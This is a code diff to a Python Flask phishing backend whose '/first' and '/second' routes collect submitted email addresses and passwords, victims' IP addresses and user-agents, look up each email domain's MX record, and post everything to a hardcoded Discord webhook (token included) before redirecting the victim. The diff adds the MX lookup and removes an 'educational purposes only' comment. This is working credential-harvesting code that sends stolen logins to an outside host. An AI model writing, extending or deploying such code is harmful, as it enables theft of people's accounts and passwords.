@@ -19,14 +19,7 @@ import dns.resolver
 # Discord Webhook URL
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995643497681058/XBIWTD-VWQ0Ssg5KUR3ojdSuCkJFhRIw2TgYAvIXZce5BrVWVRQp0n9cySRZAdb1wQIe"
 
-#def get_mx_records(domain):
-    #try:
-       # answers = dns.resolver.resolve(domain, 'MX')
-       # return [str(record.exchange) for record in answers]
-    #except Exception as e:
-        #return [f"Error: {str(e)}"]
-
-def send_discord_message(email, password, ip, useragent):
+def send_discord_message(email, password, ip, useragent, domain, mx_record):
     message = {
         "username": "Logger Bot",
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
@@ -39,14 +32,25 @@ def send_discord_message(email, password, ip, useragent):
                     {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
                     {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
                     {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
-                    #{"name": "📡 MX Records", "value": "\n".join([f"`{mx}`" for mx in mx_records]), "inline": False},
+                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
+                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
                 ],
                 "footer": {"text": "Logger Bot - Secure Notifications"},
             }
         ]
     }
     
-    requests.post(DISCORD_WEBHOOK_URL, json=message)  # Educational purposes only
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=message)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message to Discord: {e}")
+
+def get_mx_record(domain):
+    try:
+        answers = dns.resolver.resolve(domain, 'MX')
+        return ', '.join(str(r.exchange) for r in answers)
+    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
+        return "No MX Record Found"
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
@@ -216,9 +220,6 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        # Introduce a randomized delay between 10 to 30 seconds
-          
-
         ip = request.headers.get('X-Forwarded-For') or \
              request.headers.get('X-Real-IP') or \
              request.headers.get('X-Client-IP') or \
@@ -228,29 +229,26 @@ def first():
         password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
 
-        # Extract domain and fetch MX records
-        #domain = email.split('@')[-1] #if email and "@" in email else None
-        #mx_records = get_mx_records(domain) #if domain else ["No domain found"]
+        # Get MX record
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
-        # Send data to Discord with MX records
-        send_discord_message(email, password, ip, useragent)
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
 
         # Store email in session
         session['eman'] = email
 
-        # Redirect as in your original code
+        # Redirect
         return redirect(url_for('benza', web=email))
 
-    return "Method Not Allowed", 405  # Handle wrong request method
+    return "Method Not Allowed", 405
 
 
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        # Introduce a randomized delay between 10 to 30 seconds
-        
-
         ip = request.headers.get('X-Forwarded-For') or \
              request.headers.get('X-Real-IP') or \
              request.headers.get('X-Client-IP') or \
@@ -260,20 +258,20 @@ def second():
         password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
 
-        # Extract domain and fetch MX records
-        domain = email.split('@')[-1] if email and "@" in email else None
-        mx_records = get_mx_records(domain) if domain else ["No domain found"]
+        # Get MX record
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
-        # Send data to Discord with MX records
-        send_discord_message(email, password, ip, useragent, mx_records)
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
 
         # Store email in session
         session['ins'] = email
 
-        # Redirect to 'lasmo' route as in your original code
+        # Redirect
         return redirect(url_for('lasmo', web=email))
 
-    return "Method Not Allowed", 405  # Handle wrong request method
+    return "Method Not Allowed", 405
 
 
 
